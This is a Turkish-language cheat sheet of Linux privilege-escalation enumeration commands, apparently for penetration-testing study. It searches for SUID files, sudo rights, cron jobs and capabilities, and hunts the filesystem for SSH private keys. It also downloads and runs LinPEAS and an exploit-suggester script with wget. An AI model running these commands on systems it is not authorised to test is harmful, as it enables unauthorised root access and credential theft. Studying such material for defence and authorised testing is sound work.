#######################################
# LINUX PRIVILEGE ESCALATION          #
# Source : https://gtfobins.github.io/#
#######################################

#### 1. SUID ve SGID Bitleri Ayarlı Dosyaları Bulma
find / -type f -perm -04000 -ls 2>/dev/null  # SUID bit ayarlı dosyaları listele
find / -type f -perm -02000 -ls 2>/dev/null  # SGID bit ayarlı dosyaları listele
find / -type f -perm -4000 -o -perm -2000 -ls 2>/dev/null  # SUID veya SGID bit ayarlı dosyaları listele

# Açıklama: SUID ve SGID bitleri, dosyaların sahibi veya grubu gibi çalıştırılmasını sağlar. 
# Bu tür dosyalar, privilege escalation için kullanılabilir.

#####  2. Root Olarak Çalıştırılabilen Dosyalar
sudo -l  # Kullanıcının çalıştırabileceği sudo yetkili komutları listele

# Açıklama: Eğer bir komutu sudo ile parola girmeden çalıştırabiliyorsan, o komut üzerinden root yetkisi alabilirsin.

#####  3. Kullanıcı ve Grup Bilgilerini Görüntüleme
id  # Mevcut kullanıcı ID ve grup bilgilerini göster
whoami  # Hangi kullanıcı olarak oturum açtığını göster
groups  # Kullanıcının ait olduğu grupları listele

# Açıklama: Kullanıcı grupları ve yetkileri privilege escalation için önemli ipuçları içerebilir.

#####  4. Cron Job'ları Kontrol Etme
ls -la /etc/cron*  # Cron jobları listele
cat /etc/crontab  # Zamanlanmış görevleri incele

# Açıklama: Root tarafından çalıştırılan ve kötü yapılandırılmış cron görevleri exploit edilebilir.

#####  5. Yetkilendirilmiş Kullanıcılar İçin Shell Kontrolü
cat /etc/passwd | grep -v "nologin\|false"  # Shell erişimi olan kullanıcıları listele

# Açıklama: Root veya yüksek yetkili kullanıcıların shell erişimi olup olmadığını kontrol edebilirsin.

#####  6. Şifreli Dosyaları ve Anahtarları Bulma
find / -name "*.pem" 2>/dev/null  # SSH özel anahtarları ara
find / -name "*.pub" 2>/dev/null  # SSH açık anahtarlarını ara
find / -name "id_rsa" 2>/dev/null  # Özel SSH anahtarlarını ara

# Açıklama: SSH anahtarları, başka hesaplara erişim sağlamak için kullanılabilir.

#####  7. Dizinlerde Yazma İzinlerini Kontrol Etme
find / -writable -type d 2>/dev/null  # Yazılabilir dizinleri listele

# Açıklama: Eğer önemli sistem dizinlerine yazma iznin varsa, privilege escalation için kullanılabilir.

#####  8. Setcap Yetkilerine Sahip Dosyaları Listeleme
getcap -r / 2>/dev/null  # Setcap yetkili dosyaları göster

# Açıklama: Eğer bir dosyada "cap_setuid" veya "cap_net_bind_service" gibi yetkiler varsa, bu root yetkisi almak için kullanılabilir.

#####  9. Kullanıcıların Çalışan Süreçlerini ve Komutlarını Görüntüleme
ps aux  # Tüm süreçleri listele
ps aux | grep root  # Root tarafından çalışan süreçleri filtrele

# Açıklama: Çalışan süreçlerde açık bırakılan yetkili servisler privilege escalation için kullanılabilir.

#####  10. Çekirdek ve Dağıtım Bilgilerini Öğrenme
uname -a  # Çekirdek sürümünü göster
cat /etc/os-release  # Linux dağıtım bilgilerini göster

# Açıklama: Çekirdek veya sistem sürümü, exploit edilebilir bir zafiyetin olup olmadığını anlamana yardımcı olabilir.

#####  11. Linux Exploit Suggester Kullanımı (Otomatik Exploit Analizi)
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
chmod +x linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

# Açıklama: Sistem üzerinde çalışabilecek kernel exploit'leri otomatik olarak listeler.

#####  12. LinPEAS Kullanımı (Privilege Escalation Otomasyon Aracı)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Açıklama: LinPEAS, sistemdeki güvenlik açıklarını ve privilege escalation yollarını analiz eder.

###############################
# SONUÇ #
###############################
# Yukarıdaki komutlar, Linux sistemlerde root yetkisi elde etmek için kullanılabilir.
# Bu araçları etik hacking ve güvenlik araştırmaları için kullanmalısın.


